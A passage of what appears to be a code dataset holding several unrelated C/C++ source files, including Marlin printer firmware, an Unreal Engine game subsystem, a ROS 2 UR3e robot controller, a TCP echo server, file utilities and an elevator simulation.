0) {\n    std::ostringstream version_stream;\n    version_stream << \"Windows \";\n    if (IsWindows10OrGreater()) {\n      version_stream << \"10+\";\n    } else if (IsWindows8OrGreater()) {\n      version_stream << \"8\";\n    } else if (IsWindows7OrGreater()) {\n      version_stream << \"7\";\n    }\n    result->Success(flutter::EncodableValue(version_stream.str()));\n  } else {\n    result->NotImplemented();\n  }\n}\n\n}  // namespace flutter_error_handler\n",
    "/**\n * Marlin 3D Printer Firmware\n * Copyright (c) 2020 MarlinFirmware [https://github.com/MarlinFirmware/Marlin]\n *\n * Based on Sprinter and grbl.\n * Copyright (c) 2011 Camiel Gubbels / Erik van der Zalm\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <https://www.gnu.org/licenses/>.\n *\n */\n#include \"../../../inc/MarlinConfigPre.h\"\n\n#if HAS_TFT_LVGL_UI\n\n#include \"draw_ui.h\"\n#include <lv_conf.h>\n//#include \"../lvgl/src/lv_objx/lv_imgbtn.h\"\n//#include \"../lvgl/src/lv_objx/lv_img.h\"\n//#include \"../lvgl/src/lv_core/lv_disp.h\"\n//#include \"../lvgl/src/lv_core/lv_refr.h\"\n\n#include \"../../../sd/cardreader.h\"\n#include \"../../../inc/MarlinConfig.h\"\n\nstatic lv_obj_t *scr;\nextern lv_group_t*  g;\n\nstatic lv_obj_t *buttonPageUp, *buttonPageDown, *buttonBack,\n                *buttonGcode[FILE_BTN_CNT], *labelPageUp[FILE_BTN_CNT], *buttonText[FILE_BTN_CNT];\n\nenum {\n  ID_P_UP = 7,\n  ID_P_DOWN,\n  ID_P_RETURN\n};\n\nint8_t curDirLever = 0;\nLIST_FILE list_file;\nDIR_OFFSET dir_offset[10];\n\nextern uint8_t public_buf[513];\nextern char public_buf_m[100];\n\nuint8_t sel_id = 0;\n\n#if ENABLED(SDSUPPORT)\n\n  static uint8_t search_file() {\n    int valid_name_cnt = 0;\n    //char tmp[SHORT_NEME_LEN*MAX_DIR_LEVEL+1];\n\n    list_file.Sd_file_cnt = 0;\n    //list_file.Sd_file_offset = dir_offset[curDirLever].cur_page_first_offset;\n\n    //root2.rewind();\n    //SERIAL_ECHOLN(list_file.curDirPath);\n\n    if (curDirLever != 0)\n      card.cd(list_file.curDirPath);\n    else\n      card.cdroot();\n\n    const uint16_t fileCnt = card.get_num_Files();\n\n    for (uint16_t i = 0; i < fileCnt; i++) {\n      if (list_file.Sd_file_cnt == list_file.Sd_file_offset) {\n        card.getfilename_sorted(SD_ORDER(i, fileCnt));\n\n        list_file.IsFolder[valid_name_cnt] = card.flag.filenameIsDir;\n        strcpy(list_file.file_name[valid_name_cnt], list_file.curDirPath);\n        strcat_P(list_file.file_name[valid_name_cnt], PSTR(\"/\"));\n        strcat(list_file.file_name[valid_name_cnt], card.filename);\n        strcpy(list_file.long_name[valid_name_cnt], card.longest_filename());\n\n        valid_name_cnt++;\n        if (valid_name_cnt == 1)\n          dir_offset[curDirLever].cur_page_first_offset = list_file.Sd_file_offset;\n        if (valid_name_cnt >= FILE_NUM) {\n          dir_offset[curDirLever].cur_page_last_offset = list_file.Sd_file_offset;\n          list_file.Sd_file_offset++;\n          break;\n        }\n        list_file.Sd_file_offset++;\n      }\n      list_file.Sd_file_cnt++;\n    }\n    //card.closefile(false);\n    return valid_name_cnt;\n  }\n\n#endif // SDSUPPORT\n\nbool have_pre_pic(char *path) {\n  #if ENABLED(SDSUPPORT)\n    char *ps1, *ps2, *cur_name = strrchr(path, '/');\n    card.openFileRead(cur_name);\n    card.read(public_buf, 512);\n    ps1 = strstr((char *)public_buf, \";simage:\");\n    card.read(public_buf, 512);\n    ps2 = strstr((char *)public_buf, \";simage:\");\n    card.closefile();\n    if (ps1 || ps2) return true;\n  #endif\n\n  return false;\n}\n\nstatic void event_handler(lv_obj_t *obj, lv_event_t event) {\n  if (event != LV_EVENT_RELEASED) return;\n  uint8_t i, file_count = 0;\n  //switch (obj->mks_obj_id)\n  //{\n  if (obj->mks_obj_id == ID_P_UP) {\n    if (dir_offset[curDirLever].curPage > 0) {\n      // 2015.05.19\n      list_file.Sd_file_cnt = 0;\n\n      if (dir_offset[curDirLever].cur_page_first_offset >= FILE_NUM)\n        list_file.Sd_file_offset = dir_offset[curDirLever].cur_page_first_offset - FILE_NUM;\n\n      #if ENABLED(SDSUPPORT)\n        file_count = search_file();\n      #endif\n      if (file_count != 0) {\n        dir_offset[curDirLever].curPage--;\n        lv_clear_print_file();\n        disp_gcode_icon(file_count);\n      }\n    }\n  }\n  else if (obj->mks_obj_id == ID_P_DOWN) {\n    if (dir_offset[curDirLever].cur_page_last_offset > 0) {\n      list_file.Sd_file_cnt    = 0;\n      list_file.Sd_file_offset = dir_offset[curDirLever].cur_page_last_offset + 1;\n      #if ENABLED(SDSUPPORT)\n        file_count = search_file();\n      #endif\n      if (file_count != 0) {\n        dir_offset[curDirLever].curPage++;\n        lv_clear_print_file();\n        disp_gcode_icon(file_count);\n      }\n      if (file_count < FILE_NUM)\n        dir_offset[curDirLever].cur_page_last_offset = 0;\n    }\n  }\n  else if (obj->mks_obj_id == ID_P_RETURN) {\n    if (curDirLever > 0) {\n      int8_t *ch = (int8_t *)strrchr(list_file.curDirPath, '/');\n      if (ch) {\n        *ch = 0;\n        #if ENABLED(SDSUPPORT)\n          card.cdup();\n        #endif\n      ",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"ElementSubsystem.h\"\n#include \"wunthshin/Data/Elements/ElementTableRow/ElementTableRow.h\"\n#include \"wunthshin/Data/Elements/O_WSElementReactor.h\"\n#include \"wunthshin/Interfaces/ElementTracked/ElementTracked.h\"\n\nDEFINE_LOG_CATEGORY(LogElementSubsystem);\n\nuint32 GetTypeHash(const FElementRowHandle& InDataTableHandle)\n{\n\treturn CityHash32(reinterpret_cast<const char*>(&InDataTableHandle), sizeof(InDataTableHandle));\n}\n\nUElementSubsystem::UElementSubsystem()\n{\n\tstatic ConstructorHelpers::FObjectFinder<UDataTable> Table(TEXT(\"/Script/Engine.DataTable'/Game/DataTable/DT_ElementTable.DT_ElementTable'\"));\n\tcheck(Table.Object);\n\tDataTable = Table.Object;\n}\n\nFElementRowHandle UElementSubsystem::GetElementHandle(const UWorld* InWorld, const FName& ElementName)\n{\n\tconst FDataTableRowHandle DataTableRowHandle = InWorld->GetGameInstance()->GetSubsystem<UElementSubsystem>()->GetRowHandle(FElementTableRow::StaticStruct(), ElementName);\n\tensure(!DataTableRowHandle.IsNull());\n\t\n\treturn FElementRowHandle(DataTableRowHandle);\n}\n\nvoid UElementSubsystem::Initialize(FSubsystemCollectionBase& Collection)\n{\n\tensure(DataTable);\n\tDataTableMapping.Emplace(FElementTableRow::StaticStruct(), DataTable);\n\n\t// reactor\ub97c \ub9e4\ubc88 \uc0ac\uc6a9\ud560 \ub54c\ub9c8\ub2e4 instantiate\ud558\uc9c0 \uc54a\uace0 \ud55c\ubc88 \uc0dd\uc131\ud574\uc11c\n\t// \ubd88\ub7ec\uc640 \uc0ac\uc6a9\ud558\ub3c4\ub85d, \uc11c\ube0c\uc2dc\uc2a4\ud15c\uc5d0\uc11c \ubbf8\ub9ac \uc0dd\uc131\n\tTArray<FElementTableRow*> Rows;\n\tDataTable->GetAllRows<FElementTableRow>(TEXT(\"\"), Rows);\n\n\t// \uc804\uc218 \ud0d0\uc0c9 \ud6c4 reactor \uc0dd\uc131\n\tfor (const FElementTableRow* Row : Rows) \n\t{\n\t\tfor (const FElementReaction& Reaction : Row->Reactions) \n\t\t{\n\t\t\tif (!PreinstantiatedReactors.Contains(Reaction.Reactor)) \n\t\t\t{\n\t\t\t\tUE_LOG(LogElementSubsystem, Log, TEXT(\"%s: Reactor added\"), *Reaction.Reactor->GetName());\n\t\t\t\tPreinstantiatedReactors.Add(Reaction.Reactor);\n\t\t\t\tPreinstantiatedReactors[Reaction.Reactor] = NewObject<UO_WSElementReactor>(this, Reaction.Reactor);\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid UElementSubsystem::ApplyElement(AActor* InTarget, AActor* InInstigator, const FElementRowHandle& InElementRow)\n{\n\tUE_LOG(LogElementSubsystem, Log, TEXT(\"Applying the element %s to %s by %s\"), *InElementRow.Handle.RowName.ToString(), *InTarget->GetName(), *InInstigator->GetName());\n\tif (TrackingObjects.Contains(InTarget)) \n\t{\n\t\tFElementTrackingMap& Map = TrackingObjects[InTarget];\n\t\tMap.Add(InInstigator->GetWorld(), InInstigator, InElementRow);\n\n\t\tif (IElementTracked* Interface = Cast<IElementTracked>(InTarget))\n\t\t{\n\t\t\tInterface->OnElementApplied.Broadcast(InElementRow);\t\n\t\t}\n\n\t\tif (Map.IsFull()) \n\t\t{\n\t\t\tconst FElementReactionPair& Pair = Map.ExtractElement();\n\t\t\tUO_WSElementReactor* Reactor = GetReactor(Pair.Elements[0], Pair.Elements[1]);\n\n\t\t\tif (!Reactor)\n\t\t\t{\n\t\t\t\t// \ub9e4\uce6d\ub418\ub294 \uc694\uc18c\uc758 \ubc18\uc751\uc774 \uc5c6\ub294 \uacbd\uc6b0\n\t\t\t\tensure(false);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\t\n\t\t\tif (Pair.Instigators.Num() != 2) \n\t\t\t{\n\t\t\t\t// element\ub97c \uc801\uc6a9\ud55c \ub300\uc0c1\uc774 \ub450\uba85\uc774 \uc544\ub2cc \uacbd\uc6b0 \n\t\t\t\t// (\ub458 \ub2e4 \uac19\uc740 instigator\ub294 \uc608\uc678, \uac19\uc740 Instigator\uac00 \ub2e4\ub978 \uc18d\uc131 \ub450\uac1c\ub97c \ubd80\uc5ec\ud560 \uc218 \uc788\uc74c)\n\t\t\t\tensure(false);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\t\n\t\t\tAActor* OtherInstigator = Pair.Instigators[0] == InInstigator ? Pair.Instigators[1] : Pair.Instigators[0];\n\t\t\tUE_LOG(LogElementSubsystem, Log, TEXT(\"%s effect triggered by %s and %s!\"), *Reactor->GetName(), *InInstigator->GetName(), *OtherInstigator->GetName());\n\t\t\tReactor->React(InInstigator, OtherInstigator, InTarget);\n\n\t\t\t// \uc9c0\uae08\uae4c\uc9c0 \ucd94\uc801\ud558\ub358 \uc6d0\uc18c \uc0c1\ud0dc \ucd08\uae30\ud654\n\t\t\tTrackingObjects.Remove(InTarget);\n\t\t}\n\t}\n\telse\n\t{\n\t\t// \ucc98\uc74c \ubd80\uc5ec\ub41c \uc0c1\ud0dc\uc774\uba74 \ud6a8\uacfc\uac00 \ubc1c\uc0dd\ud560 \uc218 \uc5c6\uc74c (2\uac1c\uc758 \ub2e4\ub978 \uc870\ud569\uc73c\ub85c \ud6a8\uacfc \ubc1c\uc0dd)\n\t\tFElementTrackingMap& NewMap = TrackingObjects.Add(InTarget);\n\t\tNewMap.Add(InInstigator->GetWorld(), InInstigator, InElementRow);\n\t}\n}\n\nUO_WSElementReactor* UElementSubsystem::GetReactor(const FElementRowHandle& InLeft, const FElementRowHandle& InRight) const\n{\n\tconst FElementTableRow* LeftElement = InLeft.Handle.GetRow<FElementTableRow>(TEXT(\"\"));\n\tconst FElementReaction* LRReaction = LeftElement->Reactions.FindByPredicate([&InRight](const FElementReaction& InReaction) {\n\t\treturn InReaction.OtherElement == InRight.Handle;\n\t\t});\n\n\t// \ucc3e\uace0\uc790\ud558\ub294 \uc88c\uc6b0 \ubc18\uc751 \ud6a8\uacfc\uac00 \uc5c6\ub294 \uacbd\uc6b0\n\tensure(LRReaction);\n\n\tif (LRReaction) \n\t{\n\t\treturn GetReactor(LRReaction->Reactor);\n\t}\n\n\treturn nullptr;\n}\n\nUO_WSElementReactor* UElementSubsystem::GetReactor(TSubclassOf<UO_WSElementReactor> InReactorType) const\n{\n\tconst bool bExist = PreinstantiatedReactors.Contains(InReactorType);\n\t// \uc54c\ub824\uc9c0\uc9c0 \uc54a\uc740 reactor\ub97c \uc694\uccad\ud55c \uacbd\uc6b0\n\tensure(bExist);\n\n\tif (bExist) \n\t{\n\t\treturn PreinstantiatedReactors[InReactorType];\n\t}\n\n\treturn nullptr;\n}\n",
    "#include <ur3e_mrc/ur3e_mrc_enme480_ctrl.hpp>\n\n#define N_JOINTS 6\n#define CTRL_TO_RUN \"scaled_joint_trajectory_controller\"\n\nbool volatile grip_isON = false;\nbool volatile laserP_isON = false;\nbool volatile ur3e_isReady = false;\n\nnamespace cb_group_ur3e\n{\nclass UR3eENME480Control\n{\npublic:\n  explicit UR3eENME480Control(rclcpp::Node::SharedPtr node) : node_(node)\n  {\n    client_cb_group_ = node_->create_callback_group(rclcpp::CallbackGroupType::MutuallyExclusive);\n    sub_cb_group_ = node_->create_callback_group(rclcpp::CallbackGroupType::MutuallyExclusive);\n    io_cb_group_ = node_->create_callback_group(rclcpp::CallbackGroupType::MutuallyExclusive);\n    lp_cb_group_ = node_->create_callback_group(rclcpp::CallbackGroupType::MutuallyExclusive);\n\n    client_traj_ = rclcpp_action::create_client<control_msgs::action::FollowJointTrajectory>(node_, \"scaled_joint_trajectory_controller/follow_joint_trajectory\", client_cb_group_);\n    RCLCPP_INFO(node_->get_logger(), \"Waiting for the joint_trajectory_action server\");\n\n    bool init_status_ = false;\n    init_status_ = client_traj_->wait_for_action_server(std::chrono::seconds(20));\n    if (init_status_)\n      RCLCPP_INFO(node_->get_logger(), \"Connected to the joint_trajectory_action server\");\n    else\n      RCLCPP_ERROR(node_->get_logger(), \"Failed to connect to the joint_trajectory_action server\");\n\n    rclcpp::SubscriptionOptions options_comm;\n    options_comm.callback_group = sub_cb_group_;\n    sub_comm_ = node_->create_subscription<ur3e_mrc::msg::CommandUR3e>(\"ur3/command\", 10, std::bind(&UR3eENME480Control::comm_callback, this, std::placeholders::_1), options_comm);\n    RCLCPP_INFO(node_->get_logger(), \"Subscribed to ur3 command\");\n\n    rclcpp::SubscriptionOptions options_lp;\n    options_lp.callback_group = lp_cb_group_;\n    sub_lp_ = node_->create_subscription<std_msgs::msg::Bool>(\"ur3/laser_point\", 10, std::bind(&UR3eENME480Control::lp_callback, this, std::placeholders::_1), options_lp);\n    RCLCPP_INFO(node_->get_logger(), \"Subscribed to ur3 laser point \");    \n\n    // // Controller manager service to switch controllers\n    // controller_manager_srv_ = node_->create_client<controller_manager_msgs::srv::SwitchController>(\"controller_manager/switch_controller\");\n    // // Controller manager service to list controllers\n    // controller_list_srv_ = node_->create_client<controller_manager_msgs::srv::ListControllers>(\"controller_manager/list_controllers\");\n\n    // controller_manager_srv_->wait_for_service();\n    // controller_list_srv_->wait_for_service();\n\n    // making sure the proper controller is running\n    // ctrlRunCheck();\n\n    // Controller manager service to manage the io controller\n    io_client_srv_ = node_->create_client<ur_msgs::srv::SetIO>(\"/io_and_status_controller/set_io\", rmw_qos_profile_services_default, io_cb_group_);\n    io_client_srv_->wait_for_service();\n\n    RCLCPP_INFO(node_->get_logger(), \"Turning ON the vacuum generator\");\n    ioStartStop(1);\n\n    ur3e_isReady = true;\n\n  }\n\n  void ioStartStop(unsigned short int valPin)\n  {\n    // changing tool voltage to 12V or 0V to enable laser pointer\n    auto request_io = std::make_shared<ur_msgs::srv::SetIO::Request>();\n    request_io->fun = 4;  // 4 is FUN_SET_TOOL_VOLTAGE\n    request_io->pin = 17;   // Pin number, not important\n    if (valPin == 1) {\n      request_io->state = 12; // State\n    }\n    else {\n      request_io->state = 0; // State\n    }\n\n    // send the request and wait for the result\n    auto future_io = io_client_srv_->async_send_request(request_io);\n    if (valPin == 1) {\n      rclcpp::spin_until_future_complete(node_->get_node_base_interface(), future_io);\n      auto result_io = future_io.get();\n      if (result_io->success == true) {\n        RCLCPP_INFO(node_->get_logger(), \"Laser pointer is activated\");\n      }\n      else {  \n        RCLCPP_ERROR(node_->get_logger(), \"IO Start/Stop failed\");\n      }\n    }\n    else if (valPin == 0) {\n      rclcpp::sleep_for(std::chrono::seconds(1));\n      RCLCPP_INFO(node_->get_logger(), \"Laser pointer should be deactivated\");\n    }\n    \n\n    //turning ON the Vacuum generator\n    // auto request_io = std::make_shared<ur_msgs::srv::SetIO::Request>();\n    request_io->fun = 1;  // 1 is digital output\n    request_io->pin = 12;   // Pin number\n    request_io->state = valPin; // State\n\n    // send the request and wait for the result\n    future_io = io_client_srv_->async_send_request(request_io);\n    if (valPin == 1) {\n      rclcpp::spin_until_future_complete(node_->get_node_base_interface(), future_io);\n      auto result_io = future_io.get();\n      if (result_io->success == true) {\n        RCLCPP_INFO(node_->get_logger(), \"Vacuum generator is ON\");\n      }\n      else {  \n        RCLCPP_ERROR(node_->get_logger(), \"IO Start/Stop failed\");\n      }\n    }\n    else if (valPin == 0) {\n      rclcpp::sleep_for(std::chrono::seconds(1));\n      RCLCPP_INFO(node_->get_logger(), \"Vacuum generator should be off\");\n    }\n  }\n\n  void ioCtrl(unsigned short int numPin, unsi",
    "#ifndef _NET_CPP_\n\n#include <iostream>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\n#include <cstring>\n\n#include \"net.h\"\n#include \"shared.h\"\n\nint create_socket(int __port)\n{\n    int server_fd;\n    struct sockaddr_in address;\n\n    // Create the Socket\n    server_fd = socket(AF_INET, SOCK_STREAM, 0);\n    if (server_fd == 0)\n    {\n        perror(\"Socket failed to open\");\n        exit(EXIT_FAILURE);\n    }\n\n    // Create Address\n    address.sin_family = AF_INET;\n    address.sin_addr.s_addr = INADDR_ANY;\n    // endian form checking\n    address.sin_port = htons(__port);\n\n    // bind socket and check for error\n    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0)\n    {\n        perror(\"Could not bind socket\");\n        close(server_fd);\n        exit(EXIT_FAILURE);\n    }\n\n    if (listen(server_fd, 5) < 0)\n    {\n        perror(\"Error listening on server file descriptor\");\n        close(server_fd);\n        exit(EXIT_FAILURE);\n    }\n\n    printf(\"Server started on port %d\\n\", __port);\n    return server_fd;\n}\n\nint accept_client(int __server_fd)\n{\n    struct sockaddr_in client_address;\n    socklen_t client_len = sizeof(client_address);\n    int client_socket = accept(__server_fd, (struct sockaddr *)&client_address, &client_len);\n\n    if (client_socket < 0)\n    {\n        perror(\"Error accepting client\\n\");\n        return -1;\n    }\n    printf(\"New client connected: %d\\n\", client_socket);\n    return client_socket;\n}\n\nvoid handle_client(int __client_socket)\n{\n    char buffer[1024] = {0};\n    while (true)\n    {\n        int valread = read(__client_socket, buffer, sizeof(buffer));\n        // if nothing is read dc the client\n        if (valread <= 0)\n        {\n            printf(\"Client disconnected.\\n\");\n            close(__client_socket);\n            break;\n        }\n        printf(\"Recieved: %s\\n\", buffer);\n        std::string message(buffer, valread);\n\n        shared_struct.message_queue.push(message);\n\n\n        send(__client_socket, buffer, valread, 0);\n        memset(buffer, 0, sizeof(buffer));\n\n\n    }\n}\n\n#endif",
    "//\n// Created by dpw on 24-2-29.\n//\n\n#include \"stack\"\n#include <sys/stat.h>\n#include <dirent.h>\n#include \"sstream\"\n#include \"iostream\"\n#include <ostream>\n#include <fstream>\n#include \"vector\"\n#include \"spdlog/spdlog.h\"\n\n#include \"common_utils.h\"\n#if _WIN64\nchar sep = '\\\\';\n#pragma comment(lib, \"Shlwapi.lib\")\n#else\nchar sep = '/';\n#endif\n\n/**\n * @brief \u8fd9\u662f\u4ecetxt\u6587\u4ef6\u4e2d\u8bfb\u53d6\u6807\u7b7e\u540d\u79f0\u6570\u7ec4\u7684\u51fd\u6570\n * @param txt_path txt\u6587\u4ef6\u8def\u5f84\n * @return \u6807\u7b7e\u540d\u79f0\u6570\u7ec4\n */\nstd::vector<std::string> read_label_dict(std::string txt_path)\n{\n    std::vector <std::string> label_list;\n    std::ifstream in(txt_path);\n    std::string line;\n    if (in) {\n        while (getline(in, line)) {\n            label_list.emplace_back(line);\n        }\n    } else {\n        std::cout << \"no such label txt file: \" << txt_path << \", exit the program...\"\n                  << std::endl;\n        exit(1);\n    }\n    return label_list;\n}\n\n/**\n * @brief \u8fd9\u662f\u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u6587\u4ef6\u7684\u51fd\u6570\n * @param path \u6587\u4ef6\u8def\u5f84\n * @return\n */\nbool is_file(const std::string& path)\n{\n    struct stat s;\n    if (stat(path.c_str(), &s) == 0) {\n        return S_ISREG(s.st_mode);\n    }\n    return false;\n}\n\n/**\n * @brief \u8fd9\u662f\u5224\u65ad\u5b50\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u6587\u4ef6\u5939\u7684\u51fd\u6570\n * @param path \u6587\u4ef6\u5939\u8def\u5f84\n * @return\n */\nbool is_directory(const std::string& path)\n{\n    struct stat s;\n    if (stat(path.c_str(), &s) == 0) {\n        return S_ISDIR(s.st_mode);\n    }\n    return false;\n}\n\n/**\n * @brief \u8fd9\u662f\u5730\u5740\u62fc\u63a5\u7684\u51fd\u6570\n * @param path \u6587\u4ef6\u5939\u5730\u5740\n * @param str \u5b57\u7b26\u4e32\n * @return \u62fc\u63a5\u540e\u7684\u5b57\u7b26\u4e32\n */\nstd::string join_address(std::string path,std::string str)\n{\n    std::string _sep(1,sep);\n    if(end_with(path,_sep)){\n        int size = path.length();\n        path = path.substr(0,size-1);\n    }\n    std::string new_path = path+_sep+str;\n    return new_path;\n}\n\n/**\n * @brief \u8fd9\u662f\u5730\u5740\u62fc\u63a5\u7684\u51fd\u6570\n * @param path \u5730\u5740\n * @param strs \u5b57\u7b26\u4e32\u6570\u7ec4\n * @return \u62fc\u63a5\u540e\u7684\u5b57\u7b26\u4e32\n */\nstd::string join_address(std::string path,std::vector<std::string> strs)\n{\n    std::string _sep(1,sep);\n    if(end_with(path,_sep)){\n        int size = path.length();\n        path = path.substr(0,size-1);\n    }\n    std::string new_path = path;\n    for(int i = 0 ; i < strs.size() ; i++){\n        //new_path = join_address(new_path,strs[i]);\n        new_path = new_path+_sep+strs[i];\n    }\n    return new_path;\n}\n\n/**\n * @brief \u8fd9\u662f\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\u7684\u51fd\u6570\n * @param file_path \u6587\u4ef6\u8def\u5f84\n * @return \u6587\u4ef6\u662f\u5426\u5b58\u5728\u5e03\u5c14\u91cf\n */\nbool is_file_exists(const std::string &file_path)\n{\n    std::ifstream f(file_path.c_str());\n    return f.good();        // true\u4ee3\u8868\u6587\u4ef6\u5b58\u5728\uff0cfalse\u4ee3\u8868\u6587\u4ef6\u4e0d\u5b58\u5728\n}\n\n/**\n * @brief \u8fd9\u662f\u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u662f\u4ee5\u6307\u5b9a\u540e\u7f00\u7ed3\u5c3e\n * @param str \u6587\u4ef6\u5b57\u7b26\u4e32\n * @param suffix \u540e\u7f00\u5b57\u7b26\u4e32\n * @return True\u4ee3\u8868\u6587\u4ef6\u5b57\u7b26\u4e32\u662f\u4ee5\u6307\u5b9a\u5b57\u7b26\u4e32\u7ed3\u5c3e,False\u5219\u4ee3\u8868\u6587\u4ef6\u5b57\u7b26\u4e32\u4e0d\u662f\u4ee5\u6307\u5b9a\u5b57\u7b26\u4e32\u7ed3\u5c3e\n */\nbool end_with(const std::string &str, const std::string &suffix)\n{\n    return str.size() >= suffix.size() &&\n           str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;\n}\n\n/**\n * @brief \u8fd9\u662f\u5224\u65ad\u5b57\u7b26\u4e32\u4e2d\u662f\u5426\u5305\u542b\u5b57\u7b26\u4e32\u7684\u51fd\u6570\n * @param str \u5b57\u7b26\u4e32\n * @param sub_str \u5b50\u5b57\u7b26\u4e32\n * @return \u662f\u5426\u5305\u542b\u5b50\u5b57\u7b26\u4e32\u7684\u5e03\u5c14\u91cf\n */\nbool is_contain_sub_string(std::string str,std::string sub_str) {\n    int pos = str.find(sub_str);  // \u67e5\u627esub_str1\u5b57\u7b26\u4e32\u4f4d\u7f6e\n    bool flag = false;\n    if (pos != std::string::npos){\n        flag = true;\n    }\n    return flag;\n}\n\n/**\n * @brief \u8fd9\u662f\u5b9e\u73b0\u5b57\u7b26\u4e32\u4e2d\u5b50\u5b57\u7b26\u4e32\u7684\u66ff\u4ee3\n * @param str \u5b57\u7b26\u4e32\n * @param sub_str1 \u5b50\u5b57\u7b26\u4e321\n * @param sub_str2 \u5b50\u5b57\u7b26\u4e322\n * @return \u66ff\u6362\u540e\u7684\u5b57\u7b26\u4e32\n */\nstd::string replace(std::string str,std::string sub_str1,std::string sub_str2)\n{\n    std::string new_str = str;\n    int pos = new_str.find(sub_str1);  // \u67e5\u627esub_str1\u5b57\u7b26\u4e32\u4f4d\u7f6e\n    if (pos != std::string::npos) {   // \u5982\u679c\u627e\u5230\u4e86sub_str1\u5b57\u7b26\u4e32\n        new_str.replace(pos, sub_str1.length(), sub_str2);  // \u66ff\u6362sub_str1\u4e3asub_str2\n    }\n    return new_str;\n}\n\n/**\n * @brief \u8fd9\u662f\u6839\u636e\u5206\u5272\u7b26\u5b9e\u73b0\u5b57\u7b26\u4e32\u5206\u5272\u7684\u51fd\u6570\n * @param str \u5b57\u7b26\u4e32\n * @param delimiter \u5206\u5272\u7b26\n * @return \u5206\u5272\u540e\u7684\u5b57\u7b26\u4e32\u6570\u7ec4\n */\nstd::vector<std::string> split(std::string str, char delimiter)\n{\n    std::vector<std::string> tokens;\n    std::stringstream ss(str);\n    std::string token;\n\n    while (std::getline(ss, token, delimiter)) {\n        tokens.push_back(token);\n    }\n\n    return tokens;\n}\n\n/**\n * @brief \u8fd9\u662f\u5206\u5272\u6587\u4ef6\u8def\u5f84\u4e3a\u7236\u76ee\u5f55\u548c\u6587\u4ef6\u540d\u7684\u51fd\u6570\n * @param str \u6587\u4ef6(\u5939)\u8def\u5f84\n * @return \u7236\u76ee\u5f55\u548c\u6587\u4ef6\u540d\u7684\u6570\u7ec4\n */\nstd::vector<std::string> split_filename(std::string file_path)\n{\n    // \u6839\u636e\u6587\u4ef6\u8def\u5f84\u5206\u5272\u7b26\u8fdb\u884c\u5206\u5272\u6587\u4ef6\u8def\u5f84\n    std::vector<std::string> tokens = split(file_path,sep);\n    // \u8fd8\u539f\u7236\u76ee\u5f55\u548c\u6587\u4ef6\u540d\n    int size = tokens.size();\n    std::string dir = \"\";\n    std::string file_name = tokens[size-1];\n    for(int i = 0; i < size-1; i++){\n        dir.append(tokens[i].c_str());\n        dir.append(&sep);\n    }\n    std::vector<std::string> res = {dir,file_name};\n    return res;\n}\n\n/**\n * @brief \u8fd9\u662f\u5bf9\u6587\u4ef6\u540d\u5212\u5206\u540e\u7f00\u7684\u51fd\u6570\n * @param file_name \u6587\u4ef6\u540d\u5b57\u7b26\u4e32\n * @return \u6587\u4ef6\u540d\u79f0\u548c\u540e\u7f00\u7684\u6570\u7ec4\n */\nstd::vector<std::string> split_ext(std::string file_name)\n{\n    // \u5212\u5206\u6587\u4ef6\u540d\u79f0\u548c\u540e\u7f00\n    std::vector<std::string> res = split(file_name,'.');\n    res[1] = \".\"+res[1];\n    return res;\n}\n\n/**\n * @brief \u8fd9\u662f\u83b7\u53d6\u6587\u4ef6\u5939\u6307\u5b9a\u540e\u7f00\u7684\u6587\u4ef6\u8def\u5f84\u6570\u7ec4\n * @param dir \u6587\u4ef6\u5939\u8def\u5f84\n * @param file_paths \u56fe\u50cf\u8def\u5f84\u6570\u7ec4\n * @param ext_array \u540e\u7f00\u6570\u7ec4\n * @return \u6307\u5b9a\u540e\u7f00\u7684\u6587\u4ef6\u8def\u5f84\u6570\u7ec4\n */\nvoid get_file_paths(std::string dir,std::vector<std::string>& file_paths,std::vector<std::string> ext_array)\n{\n\n    std::stack<std::string> subdirs;\n    subdirs.push(dir);\n\n    while (!subdirs.emp",
    "#include <emscripten.h>\r\n#include <vector>\r\n#include <algorithm>\r\n#include <string>\r\n#include <sstream>\r\n\r\nclass Request {\r\npublic:\r\n    int floor;\r\n    bool direction;\r\n    int priority;\r\n\r\n    Request(int f, bool d, int p) : floor(f), direction(d), priority(p) {}\r\n};\r\n\r\nclass Elevator {\r\nprivate:\r\n    int currentFloor;\r\n    bool direction;\r\n    const int MAX_FLOOR = 10;\r\n    const int MIN_FLOOR = 1;\r\n\r\npublic:\r\n    Elevator() : currentFloor(1), direction(true) {}\r\n\r\n    void move() {\r\n        if (direction && currentFloor < MAX_FLOOR)\r\n            currentFloor++;\r\n        else if (!direction && currentFloor > MIN_FLOOR)\r\n            currentFloor--;\r\n    }\r\n\r\n    void setDirection(bool dir) { direction = dir; }\r\n    int getCurrentFloor() const { return currentFloor; }\r\n    bool getDirection() const { return direction; }\r\n};\r\n\r\nclass ElevatorSystem {\r\nprivate:\r\n    Elevator elevator;\r\n    std::vector<Request> requests;\r\n\r\n    void sortRequests() {\r\n        std::sort(requests.begin(), requests.end(), [](const Request& a, const Request& b) {\r\n            return a.priority > b.priority;\r\n        });\r\n    }\r\n\r\npublic:\r\n    void addRequest(int floor, bool direction, int priority) {\r\n        if (floor < 1 || floor > 10 || priority < 1 || priority > 5) {\r\n            return;\r\n        }\r\n        requests.emplace_back(floor, direction, priority);\r\n    }\r\n\r\n    std::string processRequests() {\r\n        std::ostringstream output;\r\n        while (!requests.empty()) {\r\n            sortRequests();\r\n            Request currentRequest = requests.front();\r\n            requests.erase(requests.begin());\r\n\r\n            output << \"Processing request: Floor \" << currentRequest.floor \r\n                   << \", Direction: \" << (currentRequest.direction ? \"Up\" : \"Down\")\r\n                   << \", Priority: \" << 